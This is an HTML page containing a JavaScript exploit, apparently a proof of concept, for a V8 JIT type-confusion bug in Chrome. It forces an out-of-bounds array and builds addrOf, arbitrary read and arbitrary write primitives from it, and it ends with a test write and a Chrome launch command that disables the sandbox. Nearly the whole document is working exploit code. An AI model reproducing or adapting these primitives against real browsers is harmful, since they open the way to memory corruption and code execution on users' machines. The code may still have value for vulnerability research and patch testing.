<div id="log"></div>
<script>
function main() {    
    function log(_string) {
        console.log(_string);
        document.getElementById("log").innerHTML += `<p>${_string}</p>`;
    }
    function hex(_val) {
        return "0x"+_val.toString(16)
    }
let bs = new ArrayBuffer(8);
let fs = new Float64Array(bs);
let is = new BigUint64Array(bs);

const ftoi = x => {
  fs[0] = x;
  return is[0];
}

const itof = x => {
  is[0] = x;
  return fs[0];
}

function foo() {
  let i = -Infinity;
  let j = 0;
  for (var k = 0; k < 1; k += i) {
    if (k == -Infinity)
      i = +Infinity;

    if (++j > 10)
      break;
  }

  let x = Math.max(k, 1024);
  x = -x;
  x = Math.max(x, -1025);
  x = -x;
  x -= 1022;
  x >>= 1;
  x += 10;

  let oob = Array(x);
  oob[0] = 1.1;

  let flt = [1.1,1.2,1.3,1.4];
  let tmp = {a: 1};
  let obj = [tmp,tmp,tmp,tmp];

  return { oob, flt, obj };
}

for (let i = 0; i < 100000; i++) foo();
let { oob, flt, obj } = foo();

for (let i = 0; i < 100; i++) {
//log(i + ": " + hex(ftoi(oob[i])))
}

eval(`%DebugPrint(${obj[0]});`)
eval(`%DebugPrint(${obj});`)
eval(`%DebugPrint(${flt});`)

let flt_MAP = 17
let flt_PROP = 18
let flt_ELEM = 19
let flt_LENG = 20

let obj_MAP = 31
let obj_PROP = 32
let obj_ELEM = 33
let obj_LENG = 34

function addrOf(_object) {
    obj[0] = _object
    let backup = oob[obj_MAP]
    oob[obj_MAP] = oob[flt_MAP]
    let address = obj[0]
    oob[obj_MAP] = backup
    log(hex(ftoi(address)))
    return ftoi(address)
}

function read(_address) {

    if (_address % 2n == 0) _address += 1n;

    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let value = flt[0]
    oob[flt_ELEM] = backup 
    log(hex(ftoi(value)))
    return ftoi(value)
}

function write(_address, _value) {

    if (_address % 2n == 0) _address += 1n;

    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    flt[0] = itof(_value)
    oob[flt_ELEM] = backup 
}

let test = [];
eval(`%DebugPrint(${test});`)
addrOf(test);
addrOf(test);
addrOf(test);
addrOf(test);
addrOf(test);
addrOf(test);
addrOf(test);
addrOf(test);
addrOf(test);
let ok = addrOf(test);
read(ok);
read(ok);
read(ok);
read(ok);
read(ok);
read(ok);
read(ok);
read(ok);
read(ok);
read(ok);
write(ok, 0x4141414141414141n); // should crash in windbg and if you dump the address of test you should see 4141414141414141
}
main()
</script>
<h1>"C:\Users\kali\AppData\Local\Google\Chrome\Application\chrome.exe" --no-sandbox --js-flags="--allow-natives-syntax" --enable-logging --v=1</h1>